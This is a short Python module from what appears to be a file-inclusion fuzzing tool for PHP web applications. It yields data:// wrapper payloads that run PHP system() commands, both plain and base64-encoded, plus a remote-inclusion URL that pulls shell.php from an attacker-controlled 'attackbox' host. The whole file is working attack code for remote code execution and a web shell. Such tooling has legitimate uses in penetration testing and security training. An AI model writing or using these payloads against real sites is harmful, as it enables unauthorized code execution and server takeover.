import base64

from .const import PHP_SHELL_CITATION, PHP_SHELL_PING

# Test:
#   - data://text/plain,<?php%20echo%20system('command');?>
#   - data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJ2NvbW1hbmQnKTsgPz4=
#   - remote code execution
#   NOTE: php://filter/convert.base64-encode/resource=... is handled in lfi_encoder
def php_fuzz(args):
    data_payloads = ["INTERESTING_INCLUDED_PAYLOAD", PHP_SHELL_CITATION, PHP_SHELL_PING]
    for payload in data_payloads:
        yield f"data://text/plain,{payload}".encode()
        yield f"data://text/plain;base64,{base64.b64encode(payload.encode()).decode()}".encode()
    
    yield f"http://{args.attackbox_ip}:{args.attackbox_web_port}/shell.php".encode()